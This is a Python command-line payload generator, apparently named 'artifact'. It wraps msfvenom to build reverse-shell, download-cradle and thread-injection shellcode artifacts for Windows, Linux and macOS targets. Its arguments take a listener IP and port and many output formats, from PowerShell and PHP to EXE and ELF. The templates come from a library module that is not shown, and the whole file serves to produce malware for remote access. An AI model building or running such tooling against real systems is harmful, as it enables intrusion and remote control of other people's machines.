#!/usr/bin/env python

try:
    import subprocess
    import argparse
    import base64
    import hashlib
    import random
    import time
except ImportError:
    print("[!] You're missing some packages, perhaps you haven't installed this tool yet?")

try:
    from .utils.artifact_library import library
    from .utils.artifact_generator import Artifact_generator 
except ImportError:
    from utils.artifact_library import library
    from utils.artifact_generator import Artifact_generator

class Artifact:
    def __init__(self):
        """ Initialize key components """
        self.string = None
        self.modified_string = None
        self.encoded_string = None
        self.byte_representation = None
        self.final_output = None

        self.ip = None
        self.port = None
        
        self.encoding = None
        self.style = None
        self.verbose = None
        self.os = None
        self.format = None

        self.parser = argparse.ArgumentParser(
            prog='artifact',
            description='The tool makesuse of msfvenom, without it you will miss out on many features.',
            epilog='Example usage: artifact -i 192.168.1.1 -p 443 -s threadi -os windows/x64 -e ps1'
        )
        self.args = None

    def parse_args(self):
        """ Create the arguments """
        self.parser.add_argument('-v', '--verbose', action='store_true', help="Verbose output")
        self.parser.add_argument('-t', '--type',
                                 help="Encode: (base64), (base32)")
        self.parser.add_argument('-s', '--style', required=True, help="Style: (rev), (download), (threadi)/ps1")
        self.parser.add_argument('-i', '--ipaddress', help="The Host IPaddress")
        self.parser.add_argument('-p', '--port', help="The Listening Port.")
        self.parser.add_argument('-o', '--os', required=True, help="Target platform: (windows/x64), (windows/x32) \
                (linux/x32), (linux/x64), (macOS)")
        self.parser.add_argument('-f', '--format', required=True, help="File extension: (ps1),(py),(pl),(sh),(js),(asp),(jsp),(war),\
                (php),(html),(exe),(elf),(macho)")
        self.args = vars(self.parser.parse_args())

    def set_arguments(self):
        """ set the arguments to variables """
        for key, val in self.args.items():
            if key == 'type':
                self.encoding = val
            elif key == 'style':
                self.style = val
            elif key == 'ipaddress':
                self.ip = val
            elif key == 'port':
                self.port = val
            elif key == 'os':
                self.os = val
            elif key == 'format':
                self.format = val
            elif key == 'verbose':
                self.verbose = val

    def grab_libstring(self):
        """ Get the string from the library """ 
        for k_os, v_os in library.items(): 
            if self.format in v_os:
                for k_ext, v_ext in v_os[self.format].items():
                    if k_ext == self.style:
                        self.string = v_ext

    def make_artifact(self):
        if self.style == 'threadi':
            #### use msfvenom to create shellcode ####
            artifact_generator = Artifact_generator(self.os, self.style, 
                                self.format,
                                self.ip, self.port, self.encoding, "sc", self.verbose)
            name = artifact_generator.msfvenom_generator()

            with open(name, 'r') as f:
                self.modified_string = self.string.replace('<shellcode>', f.read().strip())
 
            with open(f"threadi.{self.format}", 'w') as f:
                f.write(self.modified_string)

        elif self.style == 'rev':
            artifact_generator = Artifact_generator(self.os, self.style,
                                self.format, self.ip, self.port, self.encoding, None, self.verbose)
            name = artifact_generator.msfvenom_generator()

        elif self.style == 'download':
            self.modified_string = self.string.replace('<ipaddress>', self.ip).replace('<port>', self.port) 

def main():
    artifact = Artifact()
    artifact.parse_args()
    artifact.set_arguments()
    artifact.grab_libstring()
    artifact.make_artifact()

if __name__ == '__main__':
    main()
